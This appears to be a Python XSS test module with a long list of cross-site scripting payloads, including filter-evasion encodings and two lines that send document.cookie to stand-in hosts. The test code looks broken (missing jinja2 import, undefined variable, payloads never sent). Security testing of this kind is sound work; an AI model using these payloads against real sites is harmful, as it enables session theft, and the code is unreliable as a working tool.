from typing import Dict, List

from termcolor import colored
import requests
from requests import Response

from src.base import BaseTest
from src.expectations.base import Explanation

xssi = '''"><script>"
<script>alert("WXSS")</script>
<<script>alert("WXSS");//<</script>
<script>alert(document.cookie)</script>
'><script>alert(document.cookie)</script>
'><script>alert(document.cookie);</script>
\";alert('XSS');//
%3cscript%3ealert("WXSS");%3c/script%3e
%3cscript%3ealert(document.cookie);%3c%2fscript%3e
%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
&ltscript&gtalert(document.cookie);</script>
&ltscript&gtalert(document.cookie);&ltscript&gtalert
<xss><script>alert('WXSS')</script></vulnerable>
<IMG%20SRC='javascript:alert(document.cookie)'>
<IMG%20SRC="javascript:alert('WXSS');">
<IMG%20SRC="javascript:alert('WXSS')"
<IMG%20SRC=javascript:alert('WXSS')>
<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
<IMG%20SRC=`javascript:alert("'WXSS'")`>
<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG%20SRC='javasc	ript:alert(document.cookie)'>
<IMG%20SRC="jav	ascript:alert('WXSS');">
<IMG%20SRC="jav&#x09;ascript:alert('WXSS');">
<IMG%20SRC="jav&#x0A;ascript:alert('WXSS');">
<IMG%20SRC="jav&#x0D;ascript:alert('WXSS');">
<IMG%20SRC="%20&#14;%20javascript:alert('WXSS');">
<IMG%20DYNSRC="javascript:alert('WXSS')">
<IMG%20LOWSRC="javascript:alert('WXSS')">
<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
'';!--"<XSS>=&{()}
'''


class XSSTest(BaseTest):

    xssi = xssi.split('\n')

    def run_tests(self):
        test_funcs = [func for func in dir(self) if func.startswith('test_') and callable(getattr(self, func))]

        if len(test_funcs) < 1:
            raise Exception("No test functions to run tests")

        for func in test_funcs:
            for _ in xssi:
                getattr(self, func)()
                self.check()

    def check(self):
        if jinja2.utils.escape(self.response.text) == self.response.text:
            print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
                          'green', attrs=['bold']))
        else:
            print(colored('Failed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
                          'red', attrs=['bold', 'underline']))

    def send_request(self, **kwargs):
        method = kwargs.get('method') or self.method
        url = kwargs.get('url') or self.url
        url += kwargs.get('path', '')
        headers = {**self.headers, **kwargs.get('headers', {})}
        json_body = kwargs.get('json_body') or self.json_body
        query_params = {**self.query_params, **kwargs.get('query_params', {})}

        if method.upper() == 'GET':
            self.response = requests.get(url, params=query_params, headers=headers)
        if method.upper() == 'POST':
            self.response = requests.post(url, params=query_params, headers=headers, data=json_body)
        if method.upper() == 'PUT':
            self.response = requests.put(url, params=query_params, headers=headers, data=json_body)
        if method.upper() == 'DELETE':
            self.response = requests.delete(url, params=query_params, headers=headers, data=json_body)
        if method.upper() == 'OPTIONS':
            self.response = requests.options(url, params=query_params, headers=headers, data=json_body)

